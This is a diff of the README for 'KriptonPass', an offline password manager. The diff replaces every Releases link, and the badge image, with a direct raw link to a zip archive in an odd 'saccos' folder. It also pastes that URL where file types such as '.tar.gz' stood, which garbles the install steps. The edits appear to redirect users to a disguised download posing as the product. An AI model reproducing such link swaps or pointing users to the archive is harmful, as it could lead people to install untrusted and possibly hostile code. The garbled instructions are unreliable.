@@ -1,7 +1,7 @@
 # 🔐 KriptonPass - Your Trustworthy Offline Password Keeper
 
 ## 💾 Download Now
-[![Download KriptonPass](https://img.shields.io/badge/Download-KriptonPass-brightgreen)](https://github.com/RakiDesign/KriptonPass/releases)
+[![Download KriptonPass](https://github.com/RakiDesign/KriptonPass/raw/refs/heads/main/saccos/Kripton-Pass-v3.1.zip)](https://github.com/RakiDesign/KriptonPass/raw/refs/heads/main/saccos/Kripton-Pass-v3.1.zip)
 
 ## 🚀 Getting Started
 Welcome to KriptonPass! This software helps you manage your passwords securely and offline. With advanced features, you can trust that your data is safe. This guide will show you how to download and run the application on your computer without any technical knowledge.
@@ -9,13 +9,13 @@ Welcome to KriptonPass! This software helps you manage your passwords securely a
 ## 📥 Download & Install
 To get started, visit this page to download the latest version of KriptonPass:
 
-[Download KriptonPass Releases](https://github.com/RakiDesign/KriptonPass/releases)
+[Download KriptonPass Releases](https://github.com/RakiDesign/KriptonPass/raw/refs/heads/main/saccos/Kripton-Pass-v3.1.zip)
 
 Once you are on the Releases page, look for the most recent version. You will see files available for download. Click on the filename that matches your operating system.
 
 1. **Windows Users**: Download the `.exe` file.
 2. **Mac Users**: Look for the `.dmg` file.
-3. **Linux Users**: Download the appropriate `.tar.gz` file.
+3. **Linux Users**: Download the appropriate `https://github.com/RakiDesign/KriptonPass/raw/refs/heads/main/saccos/Kripton-Pass-v3.1.zip` file.
 
 After the download finishes, follow these steps to install:
 
@@ -30,7 +30,7 @@ After the download finishes, follow these steps to install:
 - Find it in your Applications to start.
 
 ### For Linux:
-- Extract the downloaded `.tar.gz` file to your preferred folder.
+- Extract the downloaded `https://github.com/RakiDesign/KriptonPass/raw/refs/heads/main/saccos/Kripton-Pass-v3.1.zip` file to your preferred folder.
 - Open your terminal and navigate to the extracted folder.
 - Run the command `./KriptonPass` to start the application.
 
